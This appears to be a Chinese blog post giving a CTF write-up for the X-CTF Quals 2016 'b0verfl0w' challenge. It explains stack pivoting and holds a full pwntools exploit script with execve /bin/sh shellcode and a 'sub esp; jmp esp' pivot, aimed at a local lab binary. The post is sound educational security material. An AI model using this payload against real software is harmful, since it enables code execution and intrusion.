---
title: 花式栈溢出- stack  pivoting
date: 2020-07-09 13:04:05
updated: 2020-07-09 13:04:05
tags:
    - 花式栈溢出
    - wiki
    - pwn
categories: 
	- 二进制安全
	- wiki-pwn
use:
  - Valine
text: true
lazyload: true
count: true
---
# 1.查看

 [X-CTF Quals 2016 - b0verfl0w](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF Quals 2016 - b0verfl0w)

![image.png](https://i.loli.net/2020/11/17/MHlGP2YLzi7R95p.png)

# 2.ida分析

![image.png](https://i.loli.net/2020/11/17/9zPpgxU7dBL3Klw.png)

栈溢出，但是长度有点小，需要转移栈

首先得控制eip到esp

![image.png](https://i.loli.net/2020/11/17/6vxzG3HF1AyhPoq.png)   

然后sub到shellcode的位置jmp后执行shellcode

# 3.编写脚本

```python
#!/usr/bin/env python
#coding=utf-8
from pwn import *
context.log_level = 'debug'

p=process('./b0verfl0w')

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"                      

payload=shellcode+(0x20-len(shellcode))*'a'+'a'*4

esp=0x08048504
payload+=p32(esp)

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
payload+=sub_esp_jmp

p.sendline(payload)
p.interactive()
```